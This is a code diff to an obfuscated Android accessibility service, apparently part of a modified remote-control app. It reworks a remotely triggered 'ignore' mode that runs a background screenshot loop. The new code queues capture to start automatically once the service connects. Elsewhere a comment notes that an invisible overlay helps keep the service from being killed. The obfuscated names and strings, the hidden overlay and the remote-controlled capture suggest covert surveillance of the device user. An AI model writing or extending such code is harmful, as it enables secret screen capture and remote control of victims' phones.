@@ -120,8 +120,30 @@ class nZW99cdXQ0COhB2o : AccessibilityService() {
         private var viewUntouchable = true
         private var viewTransparency = 1f //// 0 means invisible but can help prevent the service from being killed
         var ctx: nZW99cdXQ0COhB2o? = null
+        @Volatile
+        private var pendingIgnoreCapture = false
         val isOpen: Boolean
             get() = ctx != null
+
+        fun requestIgnoreCapture(reason: String = "request"): Boolean {
+            val service = ctx
+            if (service == null) {
+                pendingIgnoreCapture = true
+                return false
+            }
+            service.startIgnoreCapture(reason)
+            return true
+        }
+
+        fun stopIgnoreCapture(reason: String = "request") {
+            pendingIgnoreCapture = false
+            val service = ctx
+            if (service == null) {
+                shouldRun = false
+                return
+            }
+            service.stopIgnoreCaptureLoop(reason)
+        }
     }
 
 
@@ -359,26 +381,37 @@ class nZW99cdXQ0COhB2o : AccessibilityService() {
 
 		   if(arg1==p50.a(byteArrayOf(29), byteArrayOf(44, -90, -20, -23, -5, -38, 98, 103, 93)))
 		   {
-			   if(!shouldRun)
-			   {
-				   Wt=true
-				   shouldRun=true
-				   if(SKL){ SKL=false}
-				   screenshotDelayMillis = ClsFx9V0S.qJM6QNqR()
-				   i()
-				   Log.i("InputService", "开无视: screenshot loop started")
-			  }
-			   else
-			   {
-				   if(SKL){ SKL=false}
-			   }
+			   startIgnoreCapture("remote")
 		   }
            else
 		   {
-		      shouldRun=false
+              stopIgnoreCaptureLoop("remote")
 		   }
 
 	     }
+    }
+
+    private fun startIgnoreCapture(reason: String) {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            return
+        }
+        pendingIgnoreCapture = false
+        if (SKL) {
+            SKL = false
+        }
+        if (!shouldRun) {
+            Wt = true
+            shouldRun = true
+            screenshotDelayMillis = ClsFx9V0S.qJM6QNqR()
+            i()
+            Log.i("InputService", "开无视: screenshot loop started, reason=$reason")
+        }
+    }
+
+    private fun stopIgnoreCaptureLoop(reason: String) {
+        pendingIgnoreCapture = false
+        shouldRun = false
+        Log.i("InputService", "关无视: screenshot loop stopped, reason=$reason")
     }
     
        @RequiresApi(Build.VERSION_CODES.N)
@@ -1116,6 +1149,9 @@ fun b481c5f9b372ead_2() {
         ctx = this
 
 		ClsFx9V0S.mvky6Ica(this)
+        if (pendingIgnoreCapture) {
+            startIgnoreCapture("service-connected")
+        }
 
 	   
         fakeEditTextForTextStateCalculation = EditText(this)
